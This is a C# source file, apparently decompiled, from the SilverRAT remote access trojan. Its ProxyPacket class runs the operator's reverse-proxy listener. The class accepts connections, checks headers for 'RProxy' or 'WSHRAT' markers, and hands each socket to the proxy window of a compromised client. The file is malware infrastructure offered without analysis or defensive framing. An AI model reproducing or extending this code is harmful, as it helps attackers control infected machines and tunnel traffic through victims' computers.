using SilverRAT.Forms;
using System;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Helper.ReverseProxy;

public class ProxyPacket
{
    public int Int_0 { get; set; }

    public TcpListener TcpListener_0 { get; set; }

    public int Int_1 { get; set; }

    public void Method_0(int int_2, int int_3, TcpListener tcpListener_1)
    {
        Int_0 = int_2;
        Int_1 = int_3;
        TcpListener_0 = tcpListener_1;
        new Thread(Method_1).Start();
    }

    private void Method_1()
    {
        while (Settings.IsConnectedProxy)
        {
            try
            {
                TcpClient parameter = TcpListener_0.AcceptTcpClient();
                new Thread(delegate (object object_0)
                {
                    Method_4((TcpClient)object_0);
                }).Start(parameter);
                Thread.Sleep(50);
            }
            catch
            {
            }
        }
    }

    [CompilerGenerated]
    private void Method_15(object object_0)
    {
        Method_4((TcpClient)object_0);
    }

    private void Method_4(TcpClient tcpClient_0)
    {
        try
        {
            NetworkStream stream = tcpClient_0.GetStream();
            byte[] array = new byte[1];
            StringBuilder stringBuilder = new StringBuilder();
            while (Settings.IsConnectedProxy)
            {
                int num = stream.Read(array, 0, array.Length);
                if (num != 0)
                {
                    stringBuilder.Append(Encoding.ASCII.GetString(array, 0, num));
                    if (!stringBuilder.ToString().EndsWith("\r\n\r\n"))
                    {
                        continue;
                    }
                    stringBuilder = new StringBuilder(Uri.UnescapeDataString(stringBuilder.ToString()));
                    if (stringBuilder.ToString().Contains("WSHRAT"))
                    {
                        break;
                    }
                    if (!stringBuilder.ToString().Contains("RProxy"))
                    {
                        tcpClient_0.Close();
                        stream.Close();
                        break;
                    }
                    string text = stringBuilder.ToString().Substring(stringBuilder.ToString().IndexOf(":") + 1);
                    text = text.Substring(0, text.IndexOf("\r\n"));
                    bool flag = false;
                    ReversePeoxy reversePeoxy = (ReversePeoxy)Application.OpenForms["ReverseProxy:" + text];
                    if (reversePeoxy != null && reversePeoxy.Client != null)
                    {
                        reversePeoxy.Listener.TcpClient_0 = tcpClient_0;
                        flag = true;
                    }
                    if (!flag)
                    {
                        tcpClient_0.Close();
                        stream.Close();
                    }
                    break;
                }
                tcpClient_0.Close();
                stream.Close();
                break;
            }
        }
        catch
        {
            tcpClient_0.Close();
        }
    }
}
